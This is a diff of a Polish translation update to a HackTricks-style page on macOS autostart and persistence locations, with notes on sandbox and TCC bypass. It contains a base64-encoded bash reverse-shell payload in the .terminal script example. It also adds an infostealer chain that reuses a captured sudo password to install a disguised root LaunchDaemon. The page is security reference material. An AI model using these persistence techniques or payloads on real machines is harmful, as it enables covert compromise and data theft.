@@ -1,55 +1,55 @@
-# macOS Auto Start
+# macOS Autostart
 
 {{#include ../banners/hacktricks-training.md}}
 
-Ta sekcja jest w dużej mierze oparta na serii blogów [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), celem jest dodanie **więcej lokalizacji autostartu** (jeśli to możliwe), wskazanie **które techniki nadal działają** w dzisiejszych czasach z najnowszą wersją macOS (13.4) oraz określenie **wymaganych uprawnień**.
+Ta sekcja opiera się w dużej mierze na serii blogowej [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), celem jest dodanie **więcej lokalizacji autostartu** (jeśli to możliwe), wskazanie **które techniki są nadal działające** obecnie z najnowszą wersją macOS (13.4) oraz określenie potrzebnych **uprawnień**.
 
 ## Sandbox Bypass
 
 > [!TIP]
-> Tutaj możesz znaleźć lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają na proste wykonanie czegoś poprzez **zapisanie tego do pliku** i **czekanie** na bardzo **powszechną** **akcję**, określoną **ilość czasu** lub **akcję, którą zazwyczaj możesz wykonać** z wnętrza sandboxu bez potrzeby posiadania uprawnień roota.
+> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu coś wykonać przez **zapisanie tego do pliku** i **oczekiwanie** na bardzo **powszechne** **zdarzenie**, określony **czas** lub **akcję, którą zwykle możesz wykonać** z wnętrza sandboxa bez potrzeby posiadania uprawnień root.
 
 ### Launchd
 
-- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
+- Przydatne do sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
 - TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacje
 
 - **`/Library/LaunchAgents`**
-- **Wyzwalacz**: Restart
-- Wymagany root
+- **Wyzwalacz**: Ponowne uruchomienie
+- Wymagane uprawnienia root
 - **`/Library/LaunchDaemons`**
-- **Wyzwalacz**: Restart
-- Wymagany root
+- **Wyzwalacz**: Ponowne uruchomienie
+- Wymagane uprawnienia root
 - **`/System/Library/LaunchAgents`**
-- **Wyzwalacz**: Restart
-- Wymagany root
+- **Wyzwalacz**: Ponowne uruchomienie
+- Wymagane uprawnienia root
 - **`/System/Library/LaunchDaemons`**
-- **Wyzwalacz**: Restart
-- Wymagany root
+- **Wyzwalacz**: Ponowne uruchomienie
+- Wymagane uprawnienia root
 - **`~/Library/LaunchAgents`**
-- **Wyzwalacz**: Ponowne logowanie
+- **Wyzwalacz**: Ponowne zalogowanie
 - **`~/Library/LaunchDemons`**
-- **Wyzwalacz**: Ponowne logowanie
+- **Wyzwalacz**: Ponowne zalogowanie
 
 > [!TIP]
-> Jako ciekawostka, **`launchd`** ma wbudowaną listę właściwości w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Ponadto, te usługi mogą zawierać `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, co oznacza, że muszą być uruchomione i zakończone pomyślnie.
+> Ciekawostka: **`launchd`** ma osadzoną property list w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Co więcej, te usługi mogą zawierać `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, co oznacza, że muszą być uruchomione i zakończone pomyślnie.
 >
-> Oczywiście, nie można ich modyfikować z powodu podpisywania kodu.
+> Oczywiście nie można tego zmodyfikować ze względu na podpisywanie kodu.
 
-#### Opis i Eksploatacja
+#### Opis & Exploitation
 
-**`launchd`** jest **pierwszym** **procesem** wykonywanym przez jądro OX S podczas uruchamiania i ostatnim, który kończy się podczas zamykania. Zawsze powinien mieć **PID 1**. Ten proces **odczyta i wykona** konfiguracje wskazane w **ASEP** **plistach** w:
+**`launchd`** jest **pierwszym** **procesem** uruchamianym przez jądro OX S przy starcie i ostatnim, który kończy działanie przy zamykaniu. Zawsze powinien mieć **PID 1**. Ten proces będzie **odczytywać i wykonywać** konfiguracje wskazane w **ASEP** **plists** w:
 
-- `/Library/LaunchAgents`: Agenci per użytkownik zainstalowani przez administratora
-- `/Library/LaunchDaemons`: Demony systemowe zainstalowane przez administratora
-- `/System/Library/LaunchAgents`: Agenci per użytkownik dostarczani przez Apple.
-- `/System/Library/LaunchDaemons`: Demony systemowe dostarczane przez Apple.
+- `/Library/LaunchAgents`: Agenty per-user zainstalowane przez administratora
+- `/Library/LaunchDaemons`: System-wide daemons zainstalowane przez administratora
+- `/System/Library/LaunchAgents`: Agenty per-user dostarczone przez Apple
+- `/System/Library/LaunchDaemons`: System-wide daemons dostarczone przez Apple
 
-Gdy użytkownik loguje się, plisty znajdujące się w `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` są uruchamiane z **uprawnieniami zalogowanego użytkownika**.
+Kiedy użytkownik się loguje, plisty znajdujące się w `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` są uruchamiane z **uprawnieniami zalogowanego użytkownika**.
 
-**Główna różnica między agentami a demonami polega na tym, że agenci są ładowani, gdy użytkownik się loguje, a demony są ładowane podczas uruchamiania systemu** (ponieważ są usługi takie jak ssh, które muszą być uruchomione przed tym, jak jakikolwiek użytkownik uzyska dostęp do systemu). Agenci mogą również korzystać z GUI, podczas gdy demony muszą działać w tle.
+Główna różnica między agents i daemons polega na tym, że agenty są ładowane przy logowaniu użytkownika, a daemony są ładowane przy starcie systemu (np. są usługi jak ssh, które muszą być uruchomione zanim jakikolwiek użytkownik uzyska dostęp do systemu). Agenty mogą używać GUI, podczas gdy daemony muszą działać w tle.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
@@ -72,111 +72,125 @@ Gdy użytkownik loguje się, plisty znajdujące się w `/Users/$USER/Library/Lau
 </dict>
 </plist>
 ```
-Są przypadki, w których **agent musi być uruchomiony przed zalogowaniem użytkownika**, nazywane są **PreLoginAgents**. Na przykład, jest to przydatne do zapewnienia technologii wspomagającej przy logowaniu. Można je również znaleźć w `/Library/LaunchAgents` (zobacz [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).
+Są przypadki, gdy **agent musi zostać uruchomiony przed zalogowaniem użytkownika**, takie są nazywane **PreLoginAgents**. Na przykład przydaje się to do zapewnienia funkcji ułatwień dostępu podczas logowania. Można je również znaleźć w `/Library/LaunchAgents`(zobacz [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).
 
-> [!NOTE]
-> Nowe pliki konfiguracyjne Daemons lub Agents będą **ładowane po następnym uruchomieniu lub przy użyciu** `launchctl load <target.plist>`. Można **również załadować pliki .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak te pliki plist nie będą automatycznie ładowane po uruchomieniu).\
-> Można również **odłączyć** za pomocą `launchctl unload <target.plist>` (proces wskazany przez niego zostanie zakończony),
+> [!TIP]
+> Nowe pliki konfiguracyjne daemonów lub agentów zostaną **załadowane po następnym restarcie lub przy użyciu** `launchctl load <target.plist>` **Możliwe jest także załadowanie plików .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak takie pliki plist nie będą automatycznie ładowane po restarcie).\
+> Można również **odładować** przy pomocy `launchctl unload <target.plist>` (proces wskazywany przez ten plik zostanie zakończony),
 >
-> Aby **upewnić się**, że nie ma **niczego** (jak nadpisanie) **zapobiegającego** **uruchomieniu** **Agenta** lub **Daemona**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+> Aby **upewnić się**, że nie ma **niczego** (np. nadpisania) **uniemożliwiającego** agentowi lub demonowi **uruchomienie**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 
-Wylistuj wszystkie agenty i demony załadowane przez bieżącego użytkownika:
+Wypisz wszystkie agenty i demony załadowane przez bieżącego użytkownika:
 ```bash
 launchctl list
 ```
+#### Przykładowy złośliwy łańcuch LaunchDaemon (ponowne użycie hasła)
+
+A recent macOS infostealer reused a **captured sudo password** to drop a user agent and a root LaunchDaemon:
+
+- Zapisz pętlę agenta do `~/.agent` i nadaj jej prawa wykonywania.
+- Wygeneruj plist w `/tmp/starter` wskazujący na tego agenta.
+- Wykorzystaj skradzione hasło ponownie z `sudo -S`, aby skopiować go do `/Library/LaunchDaemons/com.finder.helper.plist`, ustawić `root:wheel` i załadować go za pomocą `launchctl load`.
+- Uruchom agenta cicho za pomocą `nohup ~/.agent >/dev/null 2>&1 &`, aby odłączyć wyjście.
+```bash
+printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
+printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
+printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
+nohup "$HOME/.agent" >/dev/null 2>&1 &
+```
 > [!WARNING]
-> Jeśli plist jest własnością użytkownika, nawet jeśli znajduje się w systemowych folderach demona, **zadanie zostanie wykonane jako użytkownik** a nie jako root. Może to zapobiec niektórym atakom eskalacji uprawnień.
+> Jeśli plist jest własnością użytkownika, nawet jeśli znajduje się w systemowym folderze daemonów, **zadanie zostanie wykonane jako ten użytkownik** a nie jako root. To może zapobiec niektórym atakom eskalacji uprawnień.
 
 #### Więcej informacji o launchd
 
-**`launchd`** jest **pierwszym** procesem w trybie użytkownika, który jest uruchamiany z **jądra**. Uruchomienie procesu musi być **udane** i **nie może zakończyć się błędem ani awarią**. Jest nawet **chronione** przed niektórymi **sygnałami zabicia**.
+**`launchd`** jest **pierwszym** procesem w trybie użytkownika uruchamianym przez **kernel**. Uruchomienie procesu musi się powieść i **nie może się zakończyć ani zawiesić**. Jest nawet **chroniony** przed niektórymi **sygnałami zabijającymi**.
 
-Jedną z pierwszych rzeczy, które `launchd` zrobi, jest **uruchomienie** wszystkich **demonów**, takich jak:
+Jedną z pierwszych rzeczy, które `launchd` robi, jest **uruchomienie** wszystkich **daemons**, takich jak:
 
-- **Demony czasowe** oparte na czasie do wykonania:
-- atd (`com.apple.atrun.plist`): Ma `StartInterval` wynoszący 30 minut
-- crond (`com.apple.systemstats.daily.plist`): Ma `StartCalendarInterval`, aby uruchomić o 00:15
-- **Demony sieciowe** takie jak:
-- `org.cups.cups-lpd`: Nasłuchuje w TCP (`SockType: stream`) z `SockServiceName: printer`
-- SockServiceName musi być portem lub usługą z `/etc/services`
+- **Timer daemons** uruchamiane na podstawie czasu:
+- atd (`com.apple.atrun.plist`): Ma `StartInterval` ustawiony na 30min
+- crond (`com.apple.systemstats.daily.plist`): Ma `StartCalendarInterval` ustawiony na 00:15
+- **Network daemons** takie jak:
+- `org.cups.cups-lpd`: Nasłuchuje na TCP (`SockType: stream`) z `SockServiceName: printer`
+- SockServiceName musi być albo portem albo serwisem z `/etc/services`
 - `com.apple.xscertd.plist`: Nasłuchuje na TCP na porcie 1640
-- **Demony ścieżkowe**, które są uruchamiane, gdy zmienia się określona ścieżka:
+- **Path daemons** uruchamiane, gdy określona ścieżka ulega zmianie:
 - `com.apple.postfix.master`: Sprawdza ścieżkę `/etc/postfix/aliases`
-- **Demony powiadomień IOKit**:
+- **IOKit notifications daemons**:
 - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
-- **Port Mach:**
-- `com.apple.xscertd-helper.plist`: Wskazuje w wpisie `MachServices` nazwę `com.apple.xscertd.helper`
+- **Mach port:**
+- `com.apple.xscertd-helper.plist`: W wpisie `MachServices` wskazuje nazwę `com.apple.xscertd.helper`
 - **UserEventAgent:**
-- To różni się od poprzedniego. Sprawia, że launchd uruchamia aplikacje w odpowiedzi na określone zdarzenie. Jednak w tym przypadku główny binarny plik zaangażowany to nie `launchd`, ale `/usr/libexec/UserEventAgent`. Ładuje wtyczki z folderu ograniczonego przez SIP /System/Library/UserEventPlugins/, gdzie każda wtyczka wskazuje swój inicjalizator w kluczu `XPCEventModuleInitializer` lub, w przypadku starszych wtyczek, w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w swoim `Info.plist`.
+- To różni się od poprzedniego. Sprawia, że launchd uruchamia aplikacje w odpowiedzi na konkretne zdarzenia. Jednak w tym przypadku główny binarny plik zaangażowany nie jest `launchd`, lecz `/usr/libexec/UserEventAgent`. Ładuje on pluginy z ograniczonego przez SIP folderu /System/Library/UserEventPlugins/, gdzie każdy plugin wskazuje swój inicjalizator w kluczu `XPCEventModuleInitializer` lub, w przypadku starszych pluginów, w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w jego `Info.plist`.
 
 ### pliki startowe powłoki
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
 Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Ale musisz znaleźć aplikację z obejściem TCC, która uruchamia powłokę ładującą te pliki
+- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
+- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
+- Jednak musisz znaleźć aplikację z TCC bypass, która uruchamia shell ładujący te pliki
 
-#### Lokalizacje
+#### Lokacje
 
 - **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
 - **Wyzwalacz**: Otwórz terminal z zsh
 - **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
 - **Wyzwalacz**: Otwórz terminal z zsh
-- Wymagany root
+- Wymagane uprawnienia root
 - **`~/.zlogout`**
-- **Wyzwalacz**: Wyjdź z terminala z zsh
+- **Wyzwalacz**: Zamknij terminal z zsh
 - **`/etc/zlogout`**
-- **Wyzwalacz**: Wyjdź z terminala z zsh
-- Wymagany root
+- **Wyzwalacz**: Zamknij terminal z zsh
+- Wymagane uprawnienia root
 - Potencjalnie więcej w: **`man zsh`**
 - **`~/.bashrc`**
 - **Wyzwalacz**: Otwórz terminal z bash
-- `/etc/profile` (nie działa)
-- `~/.profile` (nie działa)
+- `/etc/profile` (nie działało)
+- `~/.profile` (nie działało)
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-- **Wyzwalacz**: Oczekiwano, że wyzwoli się z xterm, ale **nie jest zainstalowany** i nawet po zainstalowaniu pojawia się ten błąd: xterm: `DISPLAY is not set`
+- **Wyzwalacz**: Oczekiwano uruchomienia przez xterm, ale **nie jest zainstalowany** i nawet po instalacji pojawia się błąd: xterm: `DISPLAY is not set`
 
-#### Opis i wykorzystanie
+#### Opis i eksploatacja
 
-Podczas inicjowania środowiska powłoki, takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. macOS obecnie używa `/bin/zsh` jako domyślnej powłoki. Ta powłoka jest automatycznie dostępna, gdy aplikacja Terminal jest uruchamiana lub gdy urządzenie jest dostępne przez SSH. Chociaż `bash` i `sh` są również obecne w macOS, muszą być wyraźnie wywołane, aby mogły być używane.
+Podczas inicjowania środowiska powłoki takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. macOS obecnie używa `/bin/zsh` jako domyślnej powłoki. Ta powłoka jest automatycznie używana po uruchomieniu aplikacji Terminal lub przy dostępie do urządzenia przez SSH. Chociaż `bash` i `sh` również są obecne w macOS, trzeba je wywołać explicite, aby zostały użyte.
 
-Strona podręczna zsh, którą możemy przeczytać za pomocą **`man zsh`**, zawiera długi opis plików startowych.
+Strona podręcznika zsh, którą można przeczytać poleceniem **`man zsh`**, zawiera obszerny opis plików startowych.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
 ```
-### Ponownie otwarte aplikacje
+### Ponownie otwierane aplikacje
 
-> [!OSTRZEŻENIE]
-> Konfigurowanie wskazanej eksploatacji oraz wylogowywanie i ponowne logowanie lub nawet ponowne uruchamianie nie działało dla mnie, aby uruchomić aplikację. (Aplikacja nie była uruchamiana, być może musi być uruchomiona, gdy te działania są wykonywane)
+> [!CAUTION]
+> Konfigurowanie wskazanego exploitation oraz wylogowywanie i ponowne logowanie, a nawet reboot, nie spowodowały u mnie uruchomienia aplikacji. (Aplikacja nie była uruchamiana, być może musi być aktywna w momencie wykonywania tych akcji)
 
-**Opis**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacja
 
 - **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-- **Wyzwalacz**: Ponowne uruchomienie otwierania aplikacji
+- **Wyzwalacz**: Restart — ponowne otwieranie aplikacji
 
-#### Opis i eksploatacja
+#### Opis & Exploitation
 
 Wszystkie aplikacje do ponownego otwarcia znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
-Aby sprawić, by ponownie otwierane aplikacje uruchamiały twoją, wystarczy **dodać swoją aplikację do listy**.
+Aby aplikacje otwierane ponownie uruchamiały twoją, wystarczy **dodać swoją aplikację do listy**.
 
-UUID można znaleźć, wylistowując ten katalog lub używając `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
+UUID można znaleźć, wypisując zawartość tego katalogu lub za pomocą `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
-Aby sprawdzić aplikacje, które będą ponownie otwierane, możesz to zrobić:
+Aby sprawdzić aplikacje, które zostaną ponownie otwarte, możesz wykonać:
 ```bash
 defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
 #or
 plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-Aby **dodać aplikację do tej listy** możesz użyć:
+Aby **dodać aplikację do tej listy**, możesz użyć:
 ```bash
 # Adding iTerm2
 /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
@@ -188,24 +202,24 @@ Aby **dodać aplikację do tej listy** możesz użyć:
 ```
 ### Preferencje Terminala
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Terminal ma uprawnienia FDA użytkownika, który go używa
+- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Terminal zwykle ma uprawnienia FDA użytkownika, który go używa
 
 #### Lokalizacja
 
 - **`~/Library/Preferences/com.apple.Terminal.plist`**
-- **Wyzwalacz**: Otwórz Terminal
+- **Wyzwalacz**: Otwarcie Terminala
 
-#### Opis i Wykorzystanie
+#### Opis i eksploatacja
 
-W **`~/Library/Preferences`** przechowywane są preferencje użytkownika w Aplikacjach. Niektóre z tych preferencji mogą zawierać konfigurację do **wykonywania innych aplikacji/skryptów**.
+W **`~/Library/Preferences`** przechowywane są preferencje użytkownika dla aplikacji. Niektóre z tych preferencji mogą zawierać konfigurację do **uruchamiania innych aplikacji/skryptów**.
 
-Na przykład, Terminal może wykonać polecenie przy uruchomieniu:
+Na przykład Terminal może wykonać polecenie podczas uruchamiania:
 
 <figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
 
-Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w ten sposób:
+Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w następujący sposób:
 ```bash
 [...]
 "Window Settings" => {
@@ -221,9 +235,9 @@ Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.
 }
 [...]
 ```
-Więc, jeśli plist preferencji terminala w systemie mógłby być nadpisany, to funkcjonalność **`open`** może być użyta do **otwarcia terminala i wykonania tego polecenia**.
+Zatem, jeśli plist preferencji terminala w systemie można by było nadpisać, funkcja **`open`** może zostać użyta do **otwarcia terminala i wykonania tej komendy**.
 
-Możesz to dodać z poziomu cli za pomocą:
+Możesz dodać to z poziomu cli za pomocą:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
@@ -232,22 +246,22 @@ Możesz to dodać z poziomu cli za pomocą:
 # Remove
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
 ```
-### Terminal Scripts / Inne rozszerzenia plików
+### Skrypty Terminala / Inne rozszerzenia plików
 
 - Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Terminal używa uprawnień FDA użytkownika, który go używa
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Terminal często ma przyznane przez użytkownika uprawnienia FDA — użycie go pozwala skorzystać z tych uprawnień
 
 #### Lokalizacja
 
 - **Gdziekolwiek**
-- **Wyzwalacz**: Otwórz Terminal
+- **Wyzwalacz**: Otworzenie Terminala
 
-#### Opis i Eksploatacja
+#### Opis i wykorzystanie
 
-Jeśli stworzysz [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i go otworzysz, **aplikacja Terminal** zostanie automatycznie wywołana do wykonania wskazanych tam poleceń. Jeśli aplikacja Terminal ma jakieś specjalne uprawnienia (takie jak TCC), twoje polecenie zostanie wykonane z tymi specjalnymi uprawnieniami.
+Jeśli utworzysz [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i go otworzysz, **aplikacja Terminal** zostanie automatycznie uruchomiona, aby wykonać polecenia w niej zawarte. Jeśli aplikacja Terminal ma przyznane specjalne uprawnienia (np. TCC), Twoje polecenia zostaną uruchomione z tymi uprawnieniami.
 
-Spróbuj to z:
+Wypróbuj z:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -275,47 +289,47 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-Możesz również użyć rozszerzeń **`.command`**, **`.tool`**, z zawartością zwykłych skryptów powłoki, a będą one również otwierane przez Terminal.
+You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.
 
 > [!CAUTION]
-> Jeśli terminal ma **Pełny dostęp do dysku**, będzie w stanie wykonać tę akcję (zauważ, że wykonana komenda będzie widoczna w oknie terminala).
+> If Terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a Terminal.app window).
 
-### Wtyczki audio
+### Audio Plugins
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
 Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
-- Możesz uzyskać dodatkowy dostęp do TCC
+- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Możesz uzyskać dodatkowy dostęp TCC
 
-#### Lokalizacja
+#### Location
 
 - **`/Library/Audio/Plug-Ins/HAL`**
-- Wymagane uprawnienia roota
-- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
+- Wymaga root
+- **Trigger**: Restart coreaudiod or the computer
 - **`/Library/Audio/Plug-ins/Components`**
-- Wymagane uprawnienia roota
-- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
+- Wymaga root
+- **Trigger**: Restart coreaudiod or the computer
 - **`~/Library/Audio/Plug-ins/Components`**
-- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
+- **Trigger**: Restart coreaudiod or the computer
 - **`/System/Library/Components`**
-- Wymagane uprawnienia roota
-- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
+- Wymaga root
+- **Trigger**: Restart coreaudiod or the computer
 
-#### Opis
+#### Description
 
-Zgodnie z wcześniejszymi opisami, możliwe jest **kompilowanie niektórych wtyczek audio** i załadowanie ich.
+According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.
 
-### Wtyczki QuickLook
+### QuickLook Plugins
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
-- Możesz uzyskać dodatkowy dostęp do TCC
+- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Możesz uzyskać dodatkowy dostęp TCC
 
-#### Lokalizacja
+#### Location
 
 - `/System/Library/QuickLook`
 - `/Library/QuickLook`
@@ -323,28 +337,28 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.g
 - `/Applications/AppNameHere/Contents/Library/QuickLook/`
 - `~/Applications/AppNameHere/Contents/Library/QuickLook/`
 
-#### Opis i eksploatacja
+#### Description & Exploitation
 
-Wtyczki QuickLook mogą być wykonywane, gdy **wyzwolisz podgląd pliku** (naciśnij spację z wybranym plikiem w Finderze) i zainstalowana jest **wtyczka obsługująca ten typ pliku**.
+QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.
 
-Możliwe jest skompilowanie własnej wtyczki QuickLook, umieszczenie jej w jednej z wcześniejszych lokalizacji, aby ją załadować, a następnie przejście do obsługiwanego pliku i naciśnięcie spacji, aby ją wyzwolić.
+It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.
 
-### ~~Hooki logowania/wylogowania~~
+### ~~Login/Logout Hooks~~
 
 > [!CAUTION]
-> To nie zadziałało dla mnie, ani z LoginHook użytkownika, ani z LogoutHook roota
+> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Lokalizacja
+#### Location
 
-- Musisz być w stanie wykonać coś takiego jak `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
+- Musisz móc wykonać coś w stylu `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
 - `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`
 
-Są przestarzałe, ale mogą być używane do wykonywania poleceń, gdy użytkownik się loguje.
+Są przestarzałe, ale można ich użyć do wykonywania poleceń podczas logowania użytkownika.
 ```bash
 cat > $HOME/hook.sh << EOF
 #!/bin/bash
@@ -371,68 +385,68 @@ Aby to usunąć:
 defaults delete com.apple.loginwindow LoginHook
 defaults delete com.apple.loginwindow LogoutHook
 ```
-Użytkownik root jest przechowywany w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
+The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
 
-## Ominięcie piaskownicy warunkowej
+## Conditional Sandbox Bypass
 
 > [!TIP]
-> Tutaj możesz znaleźć lokalizacje startowe przydatne do **ominięcia piaskownicy**, które pozwalają na proste wykonanie czegoś poprzez **zapisanie tego w pliku** i **oczekiwanie na nie super powszechne warunki**, takie jak konkretne **zainstalowane programy, "niezwykłe" działania użytkowników** lub środowiska.
+> Tutaj znajdziesz miejsca startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **oczekując na niezbyt powszechne warunki** takich jak konkretne **zainstalowane programy, "nietypowe" działania użytkownika** lub środowiska.
 
 ### Cron
 
 **Opis**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)
 
-- Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Jednak musisz być w stanie wykonać binarny plik `crontab`
-- Lub być rootem
-- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
+- Jednak musisz móc uruchomić binarkę `crontab`
+- Lub być root
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacja
 
